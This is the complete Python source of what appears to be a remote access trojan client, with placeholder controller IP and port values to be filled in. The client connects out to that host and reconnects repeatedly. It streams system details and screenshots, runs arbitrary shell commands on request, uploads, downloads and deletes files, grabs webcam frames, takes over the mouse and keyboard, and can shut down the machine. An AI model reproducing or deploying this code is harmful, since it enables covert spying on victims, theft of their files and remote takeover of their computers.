import socket
import time
import subprocess
import json
import threading
import os
import cv2
import pyautogui
from PIL import Image
import io
import base64
import uuid
import platform
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s', datefmt='%H:%M:%S')

HOST = '%ip%'
PORT = %port%
RECONNECT_INTERVAL = 5
BUFFER_SIZE = 1024 * 1024 * 8
SOCKET_TIMEOUT = 120
CHUNK_SIZE = 1024 * 512
CLIENT_ID = str(uuid.uuid4())
SHUTDOWN_EVENT = threading.Event()

def get_system_info():
    info = {'client_id': CLIENT_ID}
    try:
        # Get IP address
        try:
            info['ip'] = socket.gethostbyname(socket.gethostname())
        except socket.gaierror as e:
            logging.error(f"Failed to get IP address: {e}")
            info['ip'] = "Unknown"

        # Get OS info
        info['os'] = platform.system() + " " + platform.release()

        # Get CPU info
        try:
            cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, timeout=5)
            if cpu.returncode == 0 and cpu.stdout:
                lines = cpu.stdout.strip().splitlines()
                info["cpu"] = lines[2].strip() if len(lines) > 2 else "Unknown"
            else:
                logging.error(f"WMIC CPU command failed: {cpu.stderr}")
                info["cpu"] = "Unknown"
        except Exception as e:
            logging.error(f"Error getting CPU info: {e}")
            info["cpu"] = "Unknown"

        # Get GPU info
        try:
            gpu = subprocess.run("wmic path win32_VideoController get name", shell=True, capture_output=True, text=True, timeout=5)
            if gpu.returncode == 0 and gpu.stdout:
                lines = gpu.stdout.strip().splitlines()
                info["gpu"] = lines[2].strip() if len(lines) > 2 else "Unknown"
            else:
                logging.error(f"WMIC GPU command failed: {gpu.stderr}")
                info["gpu"] = "Unknown"
        except Exception as e:
            logging.error(f"Error getting GPU info: {e}")
            info["gpu"] = "Unknown"

        # Get RAM info
        try:
            ram = subprocess.run("wmic computersystem get totalphysicalmemory", shell=True, capture_output=True, text=True, timeout=5)
            if ram.returncode == 0 and ram.stdout:
                lines = ram.stdout.strip().splitlines()
                ram_bytes = lines[2].strip() if len(lines) > 2 else "0"
                info["ram"] = f"{round(int(ram_bytes) / (1024**3))} GB" if ram_bytes.isdigit() else "Unknown"
            else:
                logging.error(f"WMIC RAM command failed: {ram.stderr}")
                info["ram"] = "Unknown"
        except Exception as e:
            logging.error(f"Error getting RAM info: {e}")
            info["ram"] = "Unknown"

        return info
    except Exception as e:
        logging.error(f"Unexpected error in get_system_info: {e}")
        return info

def take_screenshot(size=(160, 120)):
    try:
        screenshot = pyautogui.screenshot()
        if not screenshot:
            logging.error("Failed to capture screenshot: No screenshot returned")
            return None
        screenshot = screenshot.convert('RGB')
        screenshot = screenshot.resize(size, Image.Resampling.LANCZOS)
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG", optimize=True)
        screenshot_data = base64.b64encode(buffer.getvalue()).decode()
        logging.info(f"Screenshot captured, size: {len(screenshot_data)}, resolution: {size}")
        return screenshot_data
    except Exception as e:
        logging.error(f"Screenshot error: {e}")
        return None

def capture_camera():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            logging.error("Camera not available")
            return None
        ret, frame = cap.read()
        cap.release()
        if ret:
            frame = cv2.resize(frame, (320, 240))
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
            return base64.b64encode(buffer).decode()
        logging.error("Camera capture failed")
        return None
    except Exception as e:
        logging.error(f"Camera error: {e}")
        return None

def send_data(sock, data):
    try:
        data_bytes = data.encode('utf-8')
        total_sent = 0
        while total_sent < len(data_bytes):
            sent = sock.send(data_bytes[total_sent:total_sent + CHUNK_SIZE])
            if sent == 0:
                raise Exception("Socket connection broken")
            total_sent += sent
        logging.info(f"Sent data, size: {len(data_bytes)}")
    except Exception as e:
        logging.error(f"Send error: {e}")
        raise

def send_heartbeat(sock):
    while not SHUTDOWN_EVENT.is_set():
        try:
            if sock.fileno() == -1:
                logging.info("Socket closed, stopping heartbeat")
                break
            info = get_system_info()
            screenshot = take_screenshot(size=(160, 120))
            if screenshot:
                info['screenshot'] = screenshot
            for _ in range(3):
                try:
                    send_data(sock, json.dumps({'type': 'heartbeat', 'data': info}, separators=(',', ':')))
                    logging.info(f"Sent heartbeat with client_id: {CLIENT_ID}")
                    break
                except Exception as e:
                    logging.error(f"Heartbeat send retry: {e}")
                    time.sleep(1)
            time.sleep(5)
            send_data(sock, json.dumps({'type': 'keepalive'}, separators=(',', ':')))
            logging.info("Sent keepalive")
        except Exception as e:
            logging.error(f"Heartbeat error: {e}")
            break

def receive_full_data(sock):
    data = b""
    try:
        while True:
            packet = sock.recv(BUFFER_SIZE)
            if not packet:
                logging.info("No data received")
                return None
            data += packet
            try:
                return json.loads(data.decode('utf-8'))
            except json.JSONDecodeError:
                continue
    except socket.timeout:
        logging.error("Receive timeout")
        return None
    except Exception as e:
        logging.error(f"Receive error: {e}")
        return None

def client_loop():
    while not SHUTDOWN_EVENT.is_set():
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(SOCKET_TIMEOUT)
        try:
            logging.info(f"Attempting to connect to {HOST}:{PORT}")
            client_socket.connect((HOST, PORT))
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            logging.info(f"Connected to server {HOST}:{PORT}")

            heartbeat_thread = threading.Thread(target=send_heartbeat, args=(client_socket,))
            heartbeat_thread.daemon = True
            heartbeat_thread.start()

            while not SHUTDOWN_EVENT.is_set():
                command = receive_full_data(client_socket)
                if not command:
                    logging.info("Server disconnected")
                    break
                logging.info(f"Received command: {command}")

                try:
                    if command['type'] == 'shutdown':
                        if platform.system() == "Windows":
                            subprocess.run("shutdown /s /t 0", shell=True)
                        else:
                            logging.error("Shutdown not supported on this platform")
                    elif command['type'] == 'reboot':
                        if platform.system() == "Windows":
                            subprocess.run("shutdown /r /t 0", shell=True)
                        else:
                            logging.error("Reboot not supported on this platform")
                    elif command['type'] == 'open_app':
                        try:
                            subprocess.run(command['data'], shell=True, timeout=10)
                            send_data(client_socket, json.dumps({'type': 'response', 'data': f"Opened app: {command['data']}"}))
                        except Exception as e:
                            send_data(client_socket, json.dumps({'type': 'error', 'data': f"Open app error: {e}"}))
                    elif command['type'] == 'send_file':
                        try:
                            file_data = base64.b64decode(command['data']['content'])
                            file_path = os.path.join(os.path.expanduser("~"), command['data']['filename'])
                            with open(file_path, 'wb') as f:
                                f.write(file_data)
                            if platform.system() == "Windows":
                                os.startfile(file_path)
                            else:
                                subprocess.run(['xdg-open', file_path], check=True)
                            send_data(client_socket, json.dumps({'type': 'response', 'data': 'File received and opened'}))
                        except Exception as e:
                            send_data(client_socket, json.dumps({'type': 'error', 'data': f"File error: {e}"}))
                    elif command['type'] == 'shell':
                        try:
                            result = subprocess.run(command['data'], shell=True, capture_output=True, text=True, timeout=10)
                            send_data(client_socket, json.dumps({'type': 'shell_response', 'data': result.stdout or result.stderr}))
                        except Exception as e:
                            send_data(client_socket, json.dumps({'type': 'error', 'data': f"Shell error: {e}"}))
                    elif command['type'] == 'file_operation':
                        try:
                            op = command['data']['operation']
                            path = command['data']['path']
                            if op == 'list':
                                files = os.listdir(path)
                                file_list = [{'name': f, 'is_dir': os.path.isdir(os.path.join(path, f))} for f in files]
                                send_data(client_socket, json.dumps({'type': 'file_response', 'data': file_list}))
                            elif op == 'create':
                                os.makedirs(path, exist_ok=True)
                                send_data(client_socket, json.dumps({'type': 'file_response', 'data': 'Directory created'}))
                            elif op == 'upload':
                                file_data = base64.b64decode(command['data']['content'])
                                with open(path, 'wb') as f:
                                    f.write(file_data)
                                send_data(client_socket, json.dumps({'type': 'file_response', 'data': 'File uploaded'}))
                            elif op == 'download':
                                with open(path, 'rb') as f:
                                    file_data = base64.b64encode(f.read()).decode()
                                send_data(client_socket, json.dumps({'type': 'file_response', 'data': file_data}))
                            elif op == 'delete':
                                if os.path.isfile(path):
                                    os.remove(path)
                                else:
                                    os.rmdir(path)
                                send_data(client_socket, json.dumps({'type': 'file_response', 'data': 'File/directory deleted'}))
                        except Exception as e:
                            send_data(client_socket, json.dumps({'type': 'error', 'data': f"File operation error: {e}"}))
                    elif command['type'] == 'desktop_control':
                        try:
                            action = command['data']['action']
                            if action == 'screenshot':
                                screenshot = take_screenshot(size=(320, 240))
                                if screenshot:
                                    send_data(client_socket, json.dumps({'type': 'desktop_response', 'data': screenshot}))
                                else:
                                    send_data(client_socket, json.dumps({'type': 'error', 'data': 'Screenshot capture failed'}))
                            elif action == 'mouse_click':
                                x, y = command['data']['x'], command['data']['y']
                                pyautogui.click(x, y)
                                send_data(client_socket, json.dumps({'type': 'desktop_response', 'data': 'Mouse clicked'}))
                            elif action == 'keyboard':
                                text = command['data']['text']
                                pyautogui.write(text)
                                send_data(client_socket, json.dumps({'type': 'desktop_response', 'data': 'Text typed'}))
                        except Exception as e:
                            send_data(client_socket, json.dumps({'type': 'error', 'data': f"Desktop control error: {e}"}))
                    elif command['type'] == 'camera':
                        cam_shot = capture_camera()
                        if cam_shot:
                            send_data(client_socket, json.dumps({'type': 'camera_response', 'data': cam_shot}))
                        else:
                            send_data(client_socket, json.dumps({'type': 'error', 'data': 'Camera capture failed'}))
                except KeyError as e:
                    logging.error(f"Invalid command structure: {e}")
                    send_data(client_socket, json.dumps({'type': 'error', 'data': f"Invalid command structure: {e}"}))
        except socket.gaierror as e:
            logging.error(f"DNS resolution failed for {HOST}: {e}")
        except socket.error as e:
            logging.error(f"Connection failed: {e}")
        finally:
            client_socket.close()

        logging.info(f"Waiting {RECONNECT_INTERVAL} seconds before retrying...")
        time.sleep(RECONNECT_INTERVAL)

if __name__ == "__main__":
    try:
        logging.info(f"Starting client with ID {CLIENT_ID}...")
        client_loop()
    except KeyboardInterrupt:
        logging.info("Shutting down client...")
        SHUTDOWN_EVENT.set()